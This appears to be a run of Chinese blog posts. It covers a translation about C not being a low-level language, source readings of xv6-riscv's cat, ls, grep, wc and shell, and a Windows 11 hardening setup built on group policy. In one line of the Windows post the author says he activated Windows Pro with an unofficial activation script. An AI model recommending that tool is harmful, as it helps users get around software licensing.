在这一阶段，优化器必须与 C 的内存布局保证进行斗争。C 保证具有相同前缀的结构可以互换使用，并且它将结构字段的偏移暴露给语言。这意味着编译器不能自由地重新排列字段或插入填充以提高向量化（例如，将结构体数组转换为数组的结构体，或反之）。这对于底层编程语言来说不一定是问题，因为对数据结构布局的细粒度控制本身就是一种特性，但这确实使得让 C 变得更快变得更加困难。 C 还要求在结构体的末尾进行填充，因为它保证数组中没有填充。填充是 C 规范中一个特别复杂的部分，并且与语言的其他部分互动不佳。例如，你必须能够使用与类型无关的比较方法（例如，memcmp）比较两个结构体，因此一个结构体的副本必须保留其填充。在一些实验中，发现某些工作负载的总运行时间有相当一部分是用来复制填充（这些填充通常尺寸不合适且对齐不理想）。 考虑 C 编译器执行的两项核心优化：SROA（聚合体的标量替换，scalar replacement of aggregates）和循环展开。SROA 尝试将结构体（以及具有固定长度的数组）替换为单独的变量。这样，编译器就可以将访问视为独立的，并且如果能够证明结果永远不可见，它就可以完全省略操作。这在某些情况下会删除填充，但在其他情况下则不会。 这里说的替换指的是把结构的成员提出来，把它们视作单独的对象处理 第二项优化，循环展开，将包含条件语句的循环转换为两条路径中各自带有循环的条件语句。这改变了控制流，违反了程序员知道底层编程语言代码运行时将执行哪些代码的假设。它还可能导致 C 中关于未指定值和未定义行为的概念出现显著问题。 在 C 中，从未初始化的变量读取值是一个未指定的值，每次读取时都允许返回任何值。这一点很重要，因为它允许像懒回收页面这样的行为：例如，在 FreeBSD 上，操作系统被告知某些页面当前未使用，而操作系统将第一次写入页面作为提示，表明该页面不再为空。对新分配内存的读取可能最初读取到之前的值；然后操作系统可能会重用底层物理页面；接着在写入页面中另一个位置时，将其替换为新零化的页面。然后从相同位置的第二次读取将返回零值。 如果未指定的值用于流程控制（例如，作为 if 语句中的条件），则结果是未定义行为：允许任何情况发生。考虑循环展开优化，这次是在循环执行零次的情况下。在原始版本中，循环的整个主体是死代码。在展开的版本中，现在有了基于变量的分支，而该变量可能未初始化。一些死代码现在变成了未定义行为。这只是 C 语义的详细调查揭示的不可靠的优化之一。 总之，确实可以让 C 代码运行得很快，但这仅通过花费数千个人年的时间来构建一个足够聪明的编译器才能实现 —— 即使如此，前提是你违反了某些语言规则。编译器开发者让 C 程序员假装他们正在编写“接近硬件”的代码，但如果他们希望 C 程序员继续相信他们在使用一种高效语言，就必须生成具有非常不同行为的机器代码。 ","date":"2024-12-19","objectID":"/posts/c_not_low_level/:3:0","tags":["C"],"title":"译文: C 不是一个底层编程语言","uri":"/posts/c_not_low_level/"},{"categories":null,"content":"理解 C 底层编程语言的一个关键特性是程序员能够轻松理解语言的抽象机器如何映射到底层物理机器。这在 PDP-11 上确实是如此，C 表达式每次都能简单地映射为一到两条指令。类似地，编译器将局部变量直接映射到栈槽，并将基本类型映射为 PDP-11 可以原生操作的东西。 从那之后，C 的实现变得越来越复杂，以维持 C 可以轻松映射到底层硬件并生成高效代码的假象。2015 年的一项调查涉及 C 程序员、编译器开发者和标准委员会成员，提出了几个关于 C 可理解性的问题。例如，C 允许实现向结构体中插入填充（但不允许在数组中插入填充），以确保所有字段都有适合目标的对齐方式。如果你将一个结构体置零，然后设置一些字段，填充位会被置零吗？根据调查结果，36% 的人确信它们会被置零，29% 的人不确定。根据不同的编译器（以及优化级别），它们可能会或可能不会被置零。 这是一个相当简单的例子，但相当一部分程序员要么相信错误的内容，要么不确定。当你引入指针时，C 的语义变得更加复杂。BCPL 模型相当简单：值就是字。每个字要么是某些数据，要么是某些数据的地址。内存是一个由地址索引的存储单元的平面数组。 相比之下，C 的模型旨在允许在各种目标平台上实现，包括分段架构（其中指针可能是段 ID 和偏移量）甚至是垃圾回收的虚拟机。C 规范小心地限制了指针上的有效操作，以避免此类系统出现问题。对缺陷报告 2601 的回应包括在指针定义中引入指针来源的概念： “实现允许追踪位模式的来源，并将代表不确定值的位模式与代表确定值的位模式区分开来。即使这些指针在位级上是相同的，基于不同来源的指针也可以被视为不同的。” “Implementations are permitted to track the origins of a bit pattern and treat those representing an indeterminate value as distinct from those representing a determined value. They may also treat pointers based on different origins as distinct even though they are bitwise identical.” 不幸的是，“provenance” 这个词在 C11 规范中并没有出现，因此由编译器开发者决定它的含义。例如，GCC 和 Clang 在指针转换为整数再转换回指针时，是否保留其来源存在差异。编译器可以自由决定，即使指针的按位比较显示它们描述的是相同的地址，指向不同结果或栈分配的两个指针也总是被判定为不相等。 这些误解并非纯粹是学术性的。例如，已经观察到由于有符号整数溢出（C 中的未定义行为）以及在进行空指针检查之前解引用指针所导致的安全漏洞，这表明编译器会认为该指针不可能为空，因为在 C 中解引用空指针是未定义行为，因此可以假设不会发生。https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1897 鉴于这些问题，很难辩称程序员能够完全理解 C 程序如何映射到底层架构。 ","date":"2024-12-19","objectID":"/posts/c_not_low_level/:4:0","tags":["C"],"title":"译文: C 不是一个底层编程语言","uri":"/posts/c_not_low_level/"},{"categories":null,"content":"对非 C 处理器的想象 Spectre 和 Meltdown 的提议修复方案带来了显著的性能损失，基本抵消了过去十年微架构的进展。也许是时候停止努力让 C 代码变得更快，而是思考一下在设计为高效的处理器上，编程模型会是什么样子。 我们有一些设计的例子，它们没有专注于传统的 C 代码，提供了一些灵感。例如，高度多线程的芯片，如 Sun/Oracle 的 UltraSPARC Tx 系列，不需要那么多的缓存来保持执行单元的满载。研究处理器已将这一概念扩展到大量硬件调度的线程。这些设计背后的关键思想是，通过足够的高级并行性，你可以暂停等待内存数据的线程，并用来自其他线程的指令填充执行单元。这些设计的问题在于，C 程序往往只有很少的活跃线程。 ARM 的 SVE（标量向量扩展，Scalar Vector Extensions）—— 以及伯克利的类似工作 —— 提供了程序与硬件之间更好接口的另一个视角。传统的向量单元暴露固定大小的向量操作，并期望编译器尝试将算法映射到可用的单元大小。相比之下，SVE 接口期望程序员描述可用的并行度，并依赖硬件将其映射到可用的执行单元数量。从 C 语言中使用这一接口比较复杂，因为自动向量化器必须从循环结构中推断出可用的并行度。从函数式编程风格的映射操作生成代码是微不足道的：映射数组的长度即为可用并行度。 缓存很大，但它们复杂性的原因不仅仅是其大小。缓存一致性协议是现代 CPU 中最难同时实现快速与正确的部分之一。大多数相关的复杂性来自于支持一种语言，其中数据默认是既共享又可变的。相比之下，考虑一下 Erlang 风格的抽象机，其中每个对象要么是线程局部的，要么是不可变的（Erlang 对此做了简化，每个线程只有一个可变对象）。这种系统的缓存一致性协议将只有两种情况：可变或共享。一个软件线程迁移到另一个处理器时，需要显式地使其缓存无效，但这是一种相对不常见的操作。 一个仅仅为了速度设计的处理器，而不是在速度和 C 支持之间做出妥协的处理器，可能会支持大量线程，拥有宽大的向量单元，并且具有更简单的内存模型。在这样的系统上运行 C 代码会遇到问题，因此，考虑到世界上有大量的遗留 C 代码，它不太可能成为商业上的成功。 在软件开发中有一个常见的误区，那就是并行编程很难。对于 Alan Kay 来说，这将是一个惊讶，他能够教年轻孩子使用一个演员模型语言，并让他们编写拥有超过 200 个线程的工作程序。对于 Erlang 程序员来说，这也同样令人惊讶，他们通常编写包含成千上万并行组件的程序。更准确的说法是，在具有类似 C 抽象机的语言中并行编程很困难，而考虑到并行硬件的普及，从多核 CPU 到多核心 GPU，这也只是说 C 语言与现代硬件的匹配度较差。 http://www.open-std.org/jtc1/sc22/wg14/www/docs/dr_260.htm ↩︎ ","date":"2024-12-19","objectID":"/posts/c_not_low_level/:5:0","tags":["C"],"title":"译文: C 不是一个底层编程语言","uri":"/posts/c_not_low_level/"},{"categories":["源码阅读"],"content":"尝试把 xv6-riscv 读一遍，这是用户态的部分实用程序，cat ls 什么的","date":"2024-12-05","objectID":"/posts/xv6_riscv_read_user-utils/","tags":["Xv6_RISC-V"],"title":"xv6-riscv 源码阅读 —— 用户态: utils","uri":"/posts/xv6_riscv_read_user-utils/"},{"categories":["源码阅读"],"content":"xv6-riscv 源码阅读 —— 用户态: utils 我挑了几个常用的程序读了一下，这不代表常用的都在这里（比如 rm 也很常用，但我没有写），这里有 xv6-riscv 中的 cat、echo、ls、grep 和 wc 的源码阅读。 ","date":"2024-12-05","objectID":"/posts/xv6_riscv_read_user-utils/:0:0","tags":["Xv6_RISC-V"],"title":"xv6-riscv 源码阅读 —— 用户态: utils","uri":"/posts/xv6_riscv_read_user-utils/"},{"categories":["源码阅读"],"content":"cat cat is a standard Unix utility that reads files sequentially, writing them to standard output. cat 是一个标准的 Unix 实用程序，它顺序读取文件，并将它们写入标准输出。 cat 的 main() 函数很简单 int main(int argc, char *argv[]) { int fd, i; if(argc \u003c= 1){ cat(0); exit(0); } for(i = 1; i \u003c argc; i++){ if((fd = open(argv[i], O_RDONLY)) \u003c 0){ fprintf(2, \"cat: cannot open %s\\n\", argv[i]); exit(1); } cat(fd); close(fd); } exit(0); } 就是判断是否附加了文件名，如果没附加就从标准输入读取，这个是应用于类似管道这种情景。如果有附加文件名，就尝试只读打开并将文件描述符传给 cat() 函数做进一步处理。 cat() 函数则是直接调用 read() 系统调用读最多 512 字节出来，并调用 write() 系统调用打印出来。 void cat(int fd) { int n; while((n = read(fd, buf, sizeof(buf))) \u003e 0) { if (write(1, buf, n) != n) { fprintf(2, \"cat: write error\\n\"); exit(1); } } if(n \u003c 0){ fprintf(2, \"cat: read error\\n\"); exit(1); } } 这里的 buf 是一个全局变量 char buf[512]。 ","date":"2024-12-05","objectID":"/posts/xv6_riscv_read_user-utils/:1:0","tags":["Xv6_RISC-V"],"title":"xv6-riscv 源码阅读 —— 用户态: utils","uri":"/posts/xv6_riscv_read_user-utils/"},{"categories":["源码阅读"],"content":"echo In computing, echo is a command that outputs the strings that are passed to it as arguments. It is a command available in various operating system shells and typically used in shell scripts and batch files to output status text to the screen[1] or a computer file, or as a source part of a pipeline. 在计算机中，echo 是一个输出作为参数传递给它的字符串的命令。它是各种操作系统 shell 中可用的命令，通常在 shell 脚本和批处理文件中使用，将状态文本输出到屏幕或计算机文件，或作为管道的源部分。 #include \"kernel/types.h\" #include \"kernel/stat.h\" #include \"user/user.h\" int main(int argc, char *argv[]) { int i; for(i = 1; i \u003c argc; i++){ write(1, argv[i], strlen(argv[i])); if(i + 1 \u003c argc){ write(1, \" \", 1); } else { write(1, \"\\n\", 1); } } exit(0); } 代码很短，也很容易懂，没有说的必要 ","date":"2024-12-05","objectID":"/posts/xv6_riscv_read_user-utils/:2:0","tags":["Xv6_RISC-V"],"title":"xv6-riscv 源码阅读 —— 用户态: utils","uri":"/posts/xv6_riscv_read_user-utils/"},{"categories":["源码阅读"],"content":"ls In computing, ls is a command to list computer files and directories in Unix and Unix-like operating systems. 在计算机中，ls 是 Unix 和类 Unix 操作系统中列出计算机文件和目录的命令 int main(int argc, char *argv[]) { int i; if(argc \u003c 2){ ls(\".\"); exit(0); } for(i=1; i\u003cargc; i++) ls(argv[i]); exit(0); } main 函数只是遍历输入的参数，如果没有提供参数，就默认查看当前目录 void ls(char *path) { char buf[512], *p; int fd; struct dirent de; struct stat st; if((fd = open(path, O_RDONLY)) \u003c 0){ fprintf(2, \"ls: cannot open %s\\n\", path); return; } if(fstat(fd, \u0026st) \u003c 0){ fprintf(2, \"ls: cannot stat %s\\n\", path); close(fd); return; } switch(st.type){ case T_DEVICE: case T_FILE: printf(\"%s %d %d %d\\n\", fmtname(path), st.type, st.ino, (int) st.size); break; case T_DIR: if(strlen(path) + 1 + DIRSIZ + 1 \u003e sizeof buf){ printf(\"ls: path too long\\n\"); break; } strcpy(buf, path); p = buf+strlen(buf); *p++ = '/'; while(read(fd, \u0026de, sizeof(de)) == sizeof(de)){ if(de.inum == 0) continue; memmove(p, de.name, DIRSIZ); p[DIRSIZ] = 0; if(stat(buf, \u0026st) \u003c 0){ printf(\"ls: cannot stat %s\\n\", buf); continue; } printf(\"%s %d %d %d\\n\", fmtname(buf), st.type, st.ino, (int) st.size); } break; } close(fd); } struct stat 描述了文件的状态，按照 xv6 的定义: #define T_DIR 1 // Directory #define T_FILE 2 // File #define T_DEVICE 3 // Device struct stat { int dev; // File system's disk device uint ino; // Inode number short type; // Type of file short nlink; // Number of links to file uint64 size; // Size of file in bytes }; 根据 man page，实际的 struct stat 要比上面的定义复杂的多 struct stat { dev_t st_dev; /* ID of device containing file */ ino_t st_ino; /* Inode number */ mode_t st_mode; /* File type and mode */ nlink_t st_nlink; /* Number of hard links */ uid_t st_uid; /* User ID of owner */ gid_t st_gid; /* Group ID of owner */ dev_t st_rdev; /* Device ID (if special file) */ off_t st_size; /* Total size, in bytes */ blksize_t st_blksize; /* Block size for filesystem I/O */ blkcnt_t st_blocks; /* Number of 512 B blocks allocated */ /* Since POSIX.1-2008, this structure supports nanosecond precision for the following timestamp fields. For the details before POSIX.1-2008, see VERSIONS. */ struct timespec st_atim; /* Time of last access */ struct timespec st_mtim; /* Time of last modification */ struct timespec st_ctim; /* Time of last status change */ #define st_atime st_atim.tv_sec /* Backward compatibility */ #define st_mtime st_mtim.tv_sec #define st_ctime st_ctim.tv_sec }; 可以简单的看出：ls 函数的大致先通过 open 系统调用获得相应的文件描述符，之后根据它获取文件的状态，根据这个文件的类型再做处理 switch(st.type){ case T_DEVICE: case T_FILE: printf(\"%s %d %d %d\\n\", fmtname(path), st.type, st.ino, (int) st.size); break; case T_DIR: if(strlen(path) + 1 + DIRSIZ + 1 \u003e sizeof buf){ printf(\"ls: path too long\\n\"); break; } strcpy(buf, path); p = buf+strlen(buf); *p++ = '/'; while(read(fd, \u0026de, sizeof(de)) == sizeof(de)){ if(de.inum == 0) continue; memmove(p, de.name, DIRSIZ); p[DIRSIZ] = 0; if(stat(buf, \u0026st) \u003c 0){ printf(\"ls: cannot stat %s\\n\", buf); continue; } printf(\"%s %d %d %d\\n\", fmtname(buf), st.type, st.ino, (int) st.size); } break; } 如果该文件是设备或者文件的话，就直接输出相关信息，如果是目录则需要遍历目录中的文件，并将相关信息打印出来 struct dirent 描述了一个目录项的信息 // Directory is a file containing a sequence of dirent structures. #define DIRSIZ 14 struct dirent { ushort inum; char name[DIRSIZ]; }; 第一个是这个目录项的序号 char* fmtname(char *path) { static char buf[DIRSIZ+1]; char *p; // Find first character after last slash. for(p=path+strlen(path); p \u003e= path \u0026\u0026 *p != '/'; p--) ; p++; // Return blank-padded name. if(strlen(p) \u003e= DIRSIZ) return p; memmove(buf, p, strlen(p)); memset(buf+strlen(p), ' ', DIRSIZ-strlen(p)); return buf; } fmtname 用于将真正的文件名返回，在 ls 对 T_DIR 的处理中可以看出: if(strlen(path) + 1 + DIRSIZ + 1 \u003e sizeof buf){ printf(\"ls: path too long\\n\"); break; } strcpy(buf, path); p = buf+strlen(buf); *p++ = '/'; while(read(fd, \u0026de, sizeof(de)) == sizeof(de)){ if(de.inum == 0) continue; memmove(p, de.name, DIRSIZ); p[DIRSIZ] = 0; if(stat(buf, \u0026st) \u003c 0){ printf(\"ls: cannot stat %s\\n\", buf); continue; } printf(\"%s %d %d %d\\n\", fmtname(buf), st.type, st.ino, (int) st.si","date":"2024-12-05","objectID":"/posts/xv6_riscv_read_user-utils/:3:0","tags":["Xv6_RISC-V"],"title":"xv6-riscv 源码阅读 —— 用户态: utils","uri":"/posts/xv6_riscv_read_user-utils/"},{"categories":["源码阅读"],"content":"grep Simple grep. Only supports ^ . * $ operators. grep is a command-line utility for searching plaintext datasets for lines that match a regular expression. grep 是一个命令行实用程序，用于在纯文本数据集中搜索与正则表达式匹配的行。 xv6 的 grep 很简单，只是将匹配的输出，并且并没有支持完整的正则表达式。现实世界中，grep 不仅会输出匹配到内容的那一行，会将匹配到的内容高亮显示。 int main(int argc, char *argv[]) { int fd, i; char *pattern; if(argc \u003c= 1){ fprintf(2, \"usage: grep pattern [file ...]\\n\"); exit(1); } pattern = argv[1]; if(argc \u003c= 2){ grep(pattern, 0); exit(0); } for(i = 2; i \u003c argc; i++){ if((fd = open(argv[i], O_RDONLY)) \u003c 0){ printf(\"grep: cannot open %s\\n\", argv[i]); exit(1); } grep(pattern, fd); close(fd); } exit(0); } 可以看出，这里就是简单的获取 grep 的匹配表达式，之后根据参数的个数再做不同的处理。 void grep(char *pattern, int fd) { int n, m; char *p, *q; m = 0; while((n = read(fd, buf+m, sizeof(buf)-m-1)) \u003e 0){ m += n; buf[m] = '\\0'; p = buf; while((q = strchr(p, '\\n')) != 0){ *q = 0; if(match(pattern, p)){ *q = '\\n'; write(1, p, q+1 - p); } p = q+1; } if(m \u003e 0){ m -= p - buf; memmove(buf, p, m); } } } 这里的 while 循环就是对每一行进行处理，先通过 strchr 找到第一个换行符，将这个换行符赋为 0，之后在匹配结束后再换回来。之后再将未匹配的内容复制到 buf 的开头，并且 m 是这段内容的大小，所以下次调用 read 时从 buf + m 写入，不会影响到未匹配的那段内容，并且由于循环中上来将 buf[m] = '\\0'，导致上次未清除的内容不会影响到这次的匹配。 // Regexp matcher from Kernighan \u0026 Pike, // The Practice of Programming, Chapter 9, or // https://www.cs.princeton.edu/courses/archive/spr09/cos333/beautiful.html int matchhere(char*, char*); int matchstar(int, char*, char*); int match(char *re, char *text) { if(re[0] == '^') return matchhere(re+1, text); do{ // must look at empty string if(matchhere(re, text)) return 1; }while(*text++ != '\\0'); return 0; } // matchhere: search for re at beginning of text int matchhere(char *re, char *text) { if(re[0] == '\\0') return 1; if(re[1] == '*') return matchstar(re[0], re+2, text); if(re[0] == '$' \u0026\u0026 re[1] == '\\0') return *text == '\\0'; if(*text!='\\0' \u0026\u0026 (re[0]=='.' || re[0]==*text)) return matchhere(re+1, text+1); return 0; } // matchstar: search for c*re at beginning of text int matchstar(int c, char *re, char *text) { do{ // a * matches zero or more instances if(matchhere(re, text)) return 1; }while(*text!='\\0' \u0026\u0026 (*text++==c || c=='.')); return 0; } 这段就是具体匹配的部分。 ","date":"2024-12-05","objectID":"/posts/xv6_riscv_read_user-utils/:4:0","tags":["Xv6_RISC-V"],"title":"xv6-riscv 源码阅读 —— 用户态: utils","uri":"/posts/xv6_riscv_read_user-utils/"},{"categories":["源码阅读"],"content":"wc wc (short for word count) is a command in Unix, Plan 9, Inferno, and Unix-like operating systems. The program reads either standard input or a list of computer files and generates one or more of the following statistics: newline count, word count, and byte count. If a list of files is provided, both individual file and total statistics follow. wc（word count 的缩写）是 Unix、Plan 9、Inferno 和类 Unix 操作系统中的命令。该程序读取标准输入或计算机文件列表，并生成以下一项或多项统计数据：换行数、字数和字节数。如果提供了文件列表，则会显示单个文件和总体统计信息。 int main(int argc, char *argv[]) { int fd, i; if(argc \u003c= 1){ wc(0, \"\"); exit(0); } for(i = 1; i \u003c argc; i++){ if((fd = open(argv[i], O_RDONLY)) \u003c 0){ printf(\"wc: cannot open %s\\n\", argv[i]); exit(1); } wc(fd, argv[i]); close(fd); } exit(0); } 显而易见的 main 函数，和上面的都类似 void wc(int fd, char *name) { int i, n; int l, w, c, inword; l = w = c = 0; inword = 0; while((n = read(fd, buf, sizeof(buf))) \u003e 0){ for(i=0; i\u003cn; i++){ c++; if(buf[i] == '\\n') l++; if(strchr(\" \\r\\t\\n\\v\", buf[i])) inword = 0; else if(!inword){ w++; inword = 1; } } } if(n \u003c 0){ printf(\"wc: read error\\n\"); exit(1); } printf(\"%d %d %d %s\\n\", l, w, c, name); } 这就是不断读取文本到 buffer 中，之后遍历每个字符并记录。 ","date":"2024-12-05","objectID":"/posts/xv6_riscv_read_user-utils/:5:0","tags":["Xv6_RISC-V"],"title":"xv6-riscv 源码阅读 —— 用户态: utils","uri":"/posts/xv6_riscv_read_user-utils/"},{"categories":["Windows_杂谈"],"content":"再次安装了 Windows，尝试做一些额外的安全配置","date":"2024-12-01","objectID":"/posts/windows_note/","tags":["windows","intro"],"title":"我本次安装 Windows 的配置","uri":"/posts/windows_note/"},{"categories":["Windows_杂谈"],"content":"我给我的笔记本再次安装了一遍 Windows，它曾经被写了家庭版的密钥。我希望再次安装的时候可以直接安装专业版（Pro） 我通过 https://msdl.gravesoft.dev/#3113 下载了 Windows 11 24H2 的系统镜像，我看下载链接没什么问题就用了 所以我选择了 massgravel/Microsoft-Activation-Scripts 用于激活专业版 关于专业版，曾经有两个功能是我很喜欢的: Windows Sandbox Windows Sandbox 提供了一个轻量级桌面环境，可以安全地独立运行应用程序。安装在 Windows 沙箱环境中的软件仍然处于“沙箱”状态，并且与主机分开运行。 Microsoft Defender Application Guard Microsoft Defender Application Guard (MDAG) 旨在帮助防止旧的和新出现的攻击，以帮助保持员工的工作效率。使用我们独特的硬件隔离方法，我们的目标是通过淘汰当前的攻击方法来破坏攻击者使用的 playbook 对于 Microsoft Edge，应用程序防护有助于隔离企业定义的不受信任站点，从而在员工浏览 Internet 时保护您的公司。作为企业管理员，您可以定义受信任的网站、云资源和内部网络。不在您列表中的所有内容都被视为不可信。如果员工通过 Microsoft Edge 或 Internet Explorer 访问不受信任的站点，Microsoft Edge 会在启用 Hyper-V 的隔离容器中打开该站点。 不过在 Windows 11 24H2 之后，Microsoft Defender Application Guard 已经被移除。 安装了专业版后，设置一些组策略，摁 Windows 键搜索组策略即可进入组策略的编辑: 在 计算机配置 -\u003e 管理模板 中: 系统: Device Guard 打开基于虚拟化的安全 基于虚拟化的安全性使用 Windows 虚拟机监控程序来提供对安全服务的支持。基于虚拟化的安全性需要安全启动，并且可以选择使用 DMA 保护来启用。DMA 保护需要硬件支持，并且仅在正确配置的设备上启用。 未设置改成已启用 平台安全级别 选 安全启动和 DMA 保护 安全启动配置 选 已启用 基于虚拟化的代码完整性保护 此设置可启用基于虚拟化的内核模式代码完整性保护。启用此功能后，将强制执行内核模式内存保护，并且代码完整性验证路径受基于虚拟化的安全功能的保护。 选择 使用 UEFI 锁定启用 内核模式硬件强制堆栈保护 此设置为内核模式代码启用硬件强制堆栈保护。启用此安全功能后，内核模式数据堆栈将使用基于硬件的影子堆栈进行强化，这些堆栈存储了预期的返回地址目标，以确保程序控制流不会被篡改。 选择 在强制模式下启用 Internet 通信管理 Internet 通信设置: 关闭 Windows 客户体验改善计划: 已启用 关闭 Windows 错误报告：已启用 关闭 Windows Messenger 客户体验改善计划：已启用 OS 策略 允许使用剪切板历史记录: 已禁用 允许剪切板在设备间同步: 已禁用 启用活动源: 已禁用 允许发布用户活动: 已禁用 允许上传用户活动: 已禁用 Windows 组件 BitLocker 驱动器加密 选择驱动器加密方法和密码强度(Windows 8、Windows Server 2012、Windows 8.1 或 Windows 10 [版本 1507]) 已启动 选择加密方法: AES 256 位 操作系统驱动器 启动时需要附加身份验证: 已启用 该选项需要 TPM，Windows 11 的升级条件之一就是 TPM，并且现代的计算机都带 TPM，所以就启用了。 允许增强型启动 PIN: 已启用 之后在 Download and configure Microsoft Edge for Business 中点击 Download Windows 64-bit Policy 解压后，将 MicrosoftEdgePolicyTemplates\\windows\\admx\\msedge.admx 复制到 C:\\Windows\\PolicyDefinitions，再将 MicrosoftEdgePolicyTemplates\\windows\\zh-CN\\msedge.adml 复制到 C:\\Windows\\PolicyDefinitions\\zh-CN，之后打开组策略，就可以在管理模板中找到 Microsoft Edge 了。 Microsoft Edge 配置自动 HTTPS: 已启用 选择 通过 HTTP 传送的所有导航都将切换到 HTTPS。可能会更频繁地出现连接错误。 阻止第三方 Cookie: 已启用 我本以为这是默认的，但现在才知道 Edge 和 Chrome 都不是默认阻止第三方 Cookie 配置浏览器进程中代码完整性设置 已启用 在浏览器进程中启用代码完整性防护强制 启用联机 OCSP/CRL 检查 已启用 Chromium 默认好像会禁用该选项，印象中 OCSP 用来查验 SSL/TLS 证书是否被吊销的，FireFox 默认开启该选项，导致我 Linux 下的 FireFox 有时候打开网页的速度显著的慢，我就给关闭了。不过对于 Windows，我相信它。 不好评价它能提高多少安全性 增强 Microsoft Edge 中的安全状态 已启用 选择 严格模式 启用网络服务沙盒 已启用 限制 WebRTC 本地 IP 地址公开 已启用 选择 除非代理服务器支持 UDP，否则，请使用 TCP。这不会公开本地 IP 地址 允许网站自动播放媒体 已禁用 以上组策略部分参考自 Privacy Guides，目前 Privacy Guides 只提供了一些组策略配置: Group Policy Settings Privacy Guides 有一个已经关闭的 Pull Request: https://github.com/privacyguides/privacyguides.org/pull/2452，我也参考了下它的配置 我印象中该 PR 的作者因社区对 Microsoft Edge 的态度导致该 PR 被关闭: https://discuss.privacyguides.net/t/windows-guide/250/237，https://github.com/privacyguides/privacyguides.org/pull/2452#issuecomment-2132150704 不得不说，从隐私上来讲，一些商业公司的浏览器大多不讲它作为卖点，但是，我认同应该先谈安全，后谈隐私。 之后我启用了 BitLocker 加密 和 Windows 沙盒。 ","date":"2024-12-01","objectID":"/posts/windows_note/:0:0","tags":["windows","intro"],"title":"我本次安装 Windows 的配置","uri":"/posts/windows_note/"},{"categories":["源码阅读"],"content":"尝试把 xv6-riscv 读一遍，这是用户态的 sh 部分，一个十分简单的 shell","date":"2024-11-25","objectID":"/posts/xv6_riscv_read_user-sh/","tags":["Xv6_RISC-V"],"title":"xv6-riscv 源码阅读 —— 用户态: sh","uri":"/posts/xv6_riscv_read_user-sh/"},{"categories":["源码阅读"],"content":"概述 sh 是一个简单的 shell 程序，只支持很基本的 shell 功能。 什么是 shell ？ In computing, a shell is a computer program that exposes an operating system’s services to a human user or other programs. In general, operating system shells use either a command-line interface (CLI) or graphical user interface (GUI), depending on a computer’s role and particular operation. It is named a shell because it is the outermost layer around the operating system. 在计算机中，shell 是一种向人类用户或其他程序公开操作系统服务的计算机程序。一般来说，操作系统的 shell 使用命令行界面 (CLI) 或图形用户界面 (GUI)，具体取决于计算机的角色和特定操作。它被命名为 shell，因为它是操作系统的最外层。 Most operating system shells are not direct interfaces to the underlying kernel, even if a shell communicates with the user via peripheral devices attached to the computer directly. Shells are actually special applications that use the kernel API in just the same way as it is used by other application programs. A shell manages the user–system interaction by prompting users for input, interpreting their input, and then handling output from the underlying operating system (much like a read–eval–print loop, REPL).[3] Since the operating system shell is actually an application, it may easily be replaced with another similar application, for most operating systems 大多数操作系统的 shell 都不是底层内核的直接接口，即便 shell 通过直接连接到计算机的外围设备与用户通信也是如此。 Shell 实际上是特殊的应用程序，它们使用内核 API 的方式与其他应用程序使用的方式相同。 shell 通过提示用户输入、解释其输入，然后处理来自底层操作系统的输出（很像读取-评估-打印循环，REPL）来管理用户与系统的交互。由于操作系统 shell 实际上是一个应用程序，因此对于大多数操作系统来说，它可以很容易地被另一个类似的应用程序替换。 – https://en.wikipedia.org/wiki/Shell_(computing) Shell 可以读取用户的输入，并解释执行。这里面至少涉及到了两个会被 shell 直接调用的系统调用（相对而言的间接就是通过库函数间接调用的系统调用）： int fork(): 创建一个进程，返回子进程的 PID int exec(char *file, char *argv[]): 加载文件和参数并执行传入的 file ","date":"2024-11-25","objectID":"/posts/xv6_riscv_read_user-sh/:1:0","tags":["Xv6_RISC-V"],"title":"xv6-riscv 源码阅读 —— 用户态: sh","uri":"/posts/xv6_riscv_read_user-sh/"},{"categories":["源码阅读"],"content":"正文 int main(void) { static char buf[100]; int fd; // Ensure that three file descriptors are open. while((fd = open(\"console\", O_RDWR)) \u003e= 0){ if(fd \u003e= 3){ close(fd); break; } } // Read and run input commands. while(getcmd(buf, sizeof(buf)) \u003e= 0){ if(buf[0] == 'c' \u0026\u0026 buf[1] == 'd' \u0026\u0026 buf[2] == ' '){ // Chdir must be called by the parent, not the child. buf[strlen(buf)-1] = 0; // chop \\n if(chdir(buf+3) \u003c 0) fprintf(2, \"cannot cd %s\\n\", buf+3); continue; } if(fork1() == 0) runcmd(parsecmd(buf)); wait(0); } exit(0); } main() 函数会先关闭除那些标准 I/O 文件描述符的文件描述符。之后就开始读取输入。并且检测如果是调用的 cd 的话就直接处理好，注释也写明了，因为 cd 的行为会影响到当前的状态，所以需要由父进程来做，而不是像其他程序直接开个子进程调用就完事。cd 会调用 chdir() 系统调用来切换当前路径。 如果不是 cd，那就调用 fork() 创建子进程，在子进程中调用 parsecmd() 解析该命令，并将结果传递给 runcmd()，而父进程则是等待子进程退出。 这里的 fork1() 是对 fork() 的简单封装，多加了一个错误处理的检测。 parsecmd() 函数是这样: struct cmd* parsecmd(char *s) { char *es; struct cmd *cmd; es = s + strlen(s); cmd = parseline(\u0026s, es); peek(\u0026s, es, \"\"); if(s != es){ fprintf(2, \"leftovers: %s\\n\", s); panic(\"syntax\"); } nulterminate(cmd); return cmd; } 要执行的命令的类型被封装成了 struct cmd 结构体: struct cmd { int type; }; 因为输入的命令序列有不同类别，所以后续还有对 struct cmd 封装的结构体 struct execcmd { int type; char *argv[MAXARGS]; char *eargv[MAXARGS]; }; struct redircmd { int type; struct cmd *cmd; char *file; char *efile; int mode; int fd; }; struct pipecmd { int type; struct cmd *left; struct cmd *right; }; struct listcmd { int type; struct cmd *left; struct cmd *right; }; struct backcmd { int type; struct cmd *cmd; } 这里涉及到另一个函数 struct cmd* parseline(char **ps, char *es): struct cmd* parseline(char **ps, char *es) { struct cmd *cmd; cmd = parsepipe(ps, es); while(peek(ps, es, \"\u0026\")){ gettoken(ps, es, 0, 0); cmd = backcmd(cmd); } if(peek(ps, es, \";\")){ gettoken(ps, es, 0, 0); cmd = listcmd(cmd, parseline(ps, es)); } return cmd; } 这里就是对输入的命令序列简单做是否是需要挂在后台或者是否是一组 list。 一个命令后面接 \u0026 表明这是后台执行的，shell 不需要等待其返回，现在我们使用的 shell（如 bash） 返回后台程序的进程号，但 xv6 的这个简单 shell 没有这个功能。 而 ; 则类似 \u0026\u0026，都是将多个命令组成一个序列，不过 \u0026\u0026 会根据前面程序的运行结果以决定是否要执行后面的。 这里调用的 backcmd() 和 listcmd() 都做一些类似的工作，都是在 cmd 这个链表加新元素。 struct cmd* backcmd(struct cmd *subcmd) { struct backcmd *cmd; cmd = malloc(sizeof(*cmd)); memset(cmd, 0, sizeof(*cmd)); 